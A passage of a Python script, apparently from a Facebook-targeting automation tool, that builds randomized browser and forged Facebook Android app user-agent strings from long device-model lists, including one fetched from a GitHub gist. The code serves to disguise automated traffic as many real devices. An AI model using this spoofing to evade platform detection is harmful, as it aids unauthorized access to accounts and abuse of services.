"G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugen.append(strvoppo)
    ugen.append(strvredmi)
    ugen.append(strvoppo1)
    ugen.append(strvinfinix)
    ugen.append(strvsamsung)
    ugen.append(strvredmi1)
    ugen.append(strvnokiax)
    ugen.append(strvgt)
for op in range(1000):
    rr = random.randint
    rc = random.choice
    bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
    ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ugen.append(ua1)
    ugen.append(ua2)
    ugen.append(ua3)
    ugen.append(ua4)
    ugen.append(ua5)
for generate in range(100):
    a=random.randrange(1, 9)
    b=random.randrange(1, 9)
    c=random.randrange(7, 13)
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    ugen.append(uaku)
#▬▭▬▭▬▭▬▭[UA NORMAL MIX]▬▭▬▭▬▭▬▭#
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','SM-A145P','JSS15J', 'GT-I9500','SM-G973W','SM-M325FV','SM-S906B','SM-A127F','GT-S6500','SM-W2021','SM-A346E','SM-A515F','SM-M236B','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','SM-G780G','SM-A515F','SM-G991V','SM-A226L','SM-J326AZ','MMB29M','GT-S6102','GT-I9295','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
kkkki = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1','QP1A.579799.858'])
kkkkkz = f"|{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,99))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,19))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}"
modlss = kkkkki+kkkkkz
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
model = random.choice(['Redmi K50 Gaming','Redmi 10A','Redmi Note 11 Pro','Redmi 12C','Redmi Note 12 Pro','MI 5X'])  
version = random.choice(['8.1.0','9','10','11','12','13'])  

def bro():
    samsung = random.choice(["XT2041-1","moto g fast","XT2041-3","XT1925","XT1925-10","XT1541","XT1540","XT1548","Moto G3","XT1072","XT2045-3","XT2093-3","XT2093-7","XT2093-DL","XT2093DL","XT2045-3","XT926"])
    lol = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/'+samsung+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return lol

def br():
    kk = random.choice(["2201116SI","Redmi Note 9 Pro","M2012K11AI","M1810F6G","M1810F6I","M1803E6G","M1803E6H","M1803E6I","Redmi Y2","MDI6","Redmi Y1 Lite","Redmi X","Redmi Ultra","Redmi S2","Redmi Rise","Redmi Pro","Redmi Pad SE","Redmi Pad","Redmi Note9S","Redmi Note9","Redmi Y1","Redmi Note9","Redmi Note8","21061119AG","21061119DG","21061119AL","Redmi 10","22011119UY","21061119AG","2016060","2016090","MAG138","MAE136","Redmi 4","Redmi 4X","Redmi 4","Redmi 4 Prime","Redmi 3","2014817","2014818","HM 1S"])
    bro = f"[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/461.0.0.47.85;FBBV/451215815;FBDM/"+"{density=2.75,width=1080,height=2168}"+f";FBLC/en_US;FBRV/299927973;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{kk};FBSV/7.1.2;FBOP/1;FBCA/arm64-v8a:;]"
    return bro

def mozilla():
    fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    fbpn = random.choice(["com.facebook.katana","com.facebook.orca","messenger-android", "com.facebook.lite"])
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(10000000, 99999999))
    facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
    ua = 'Mozilla/5.0 (Linux;'+android_version+'; '+model+' Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 [FB_IAB/'+fban+';FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+fbrv+';FBCR/'+fbcr+';FBMF/asus;FBBD/asus;FBPN/'+fbpn+';FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
    return ua

def W_ueragnt():
    chrome_versions = [(80, 3987, 163), (90, 4430, 212), (100, 4896, 127)]
    webkit_versions = [(537, 36), (537, 36), (537, 36)]
    safari_versions = [500, 600]
    windows_versions = [(10, 0), (10, 1), (11, 0)]
    chrome_version = random.choice(chrome_versions)
    webkit_version = random.choice(webkit_versions)
    safari_version = random.choice(safari_versions)
    windows_version = random.choice(windows_versions)
    is_win64 = random.choice([True, False])
    win64_str = 'Win64; x64' if is_win64 else 'WOW64'
    user_agent = (
        f'Mozilla/5.0 (Windows NT {windows_version[0]}.{windows_version[1]}; {win64_str}) '
        f'AppleWebKit/{webkit_version[0]}.{webkit_version[1]} (KHTML, like Gecko) '
        f'Chrome/{chrome_version[0]}.{chrome_version[1]}.{chrome_version[2]} Safari/{safari_version}'
    )
    return user_agent

def ____useragent1____():
    version = random.choice(['14','15','10','13','7.0.0','7.1.1','9','12','11','9.0','8.0.0','7.1.2','7.0','4','5','4.4.2','5.1.1','6.0.1','9.0.1'])
    model = random.choice(['1105','1107','15','3T','62A','6779','6833','7273','9A','A1','A1 5G','A1 Pro','A11','A11k','A11x','A12','A15','A15s','A16','A16e','A16k','A16s','A17','A17k','A18','A1i 5G','A1k','A1s','A1x','A2 5G','A25','A2x 5G','A3','A3 5G','A3 Pro 5G','A30','A31','A31c','A32','A33','A33m','A33t','A34','A35','A36','A37','A37t','A38','A39','A3s','A3x 5G','A4','A40','A400','A41','A42','A43','A44','A45','A46','A47','A48','A49','A5','A5 (2020)','A50','A51','A52','A53','A53 5G','A53m','A53s','A53s 5G','A54','A54 5G','A54s','A55','A55 5G','A55s 5G','A56','A56 5G','A57','A57 (2016)','A57 (2022)','A58','A58 5G','A59','A59 5G','A59m','A59s','A59t','A5S','A60','A7','A71','A71 (2018)','A71A','A72','A72n 5G','A73','A73 5G','A73t','A74','A74 5G','A76','A77','A77 5G','A77s','A77t','A78','A78 5G','A79','A79 5G','A79k','A79t','A7n','A7x','A8','A83','A83 (2018)','A83PRO','A83t','A85T','A9','A9 (2020)','A91','A92','A92s','A93','A93s','A94','A95','A96','A96 5G','A97','A98','A98 5G','A9x','AX5','AX5s','AX7','C1','CNM632','CNM652','CPH1114','CPH1235','CPH1427','CPH1451','CPH1615','CPH1664','CPH1869','CPH1927','CPH1929','CPH1985','CPH2048','CPH2068','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2381','CPH2389','CPH2399','CPH2401','CPH2409','CPH2411','CPH2413','CPH2415','CPH2417','CPH2419','CPH2423','CPH2447','CPH2449','CPH2451','CPH2459','CPH2465','CPH2467','CPH2469','CPH2487','CPH2491','CPH2493','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2535','CPH2551','CPH2553','CPH2557','CPH2569','CPH2573','CPH2579','CPH2581','CPH2583','CPH2585','CPH2589','CPH2591','CPH2599','CPH2603','CPH2605','CPH2607','CPH2609','CPH2611','CPH2613','CPH2617','CPH2619','CPH2621','CPH2625','CPH2629','CPH2631','CPH2637','CPH2639','CPH2641','CPH2643','CPH2661','CPH2663','CPH2665','CPH2667','CPH2669','CPH2681','CPH2683','CPH2687','CPH2843','CPH2931','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','CPH9977','f','F1','F1 Plus','F10','F11','F11 Pro','F11Pro','F15','F17','F17 Pro','F19','F19 Pro','F19 Pro Plus','F19s','F1s','F21 Pro','F21s Pro','F23 5G','F25 Pro 5G','F27 Pro+ 5G','F3','F3 Plus','F5','F5 Youth','F51','F61','F7','F9','F9 Pro','Find','Find 5','Find 5 Mini','Find 7','Find 7a','Find Clover','Find 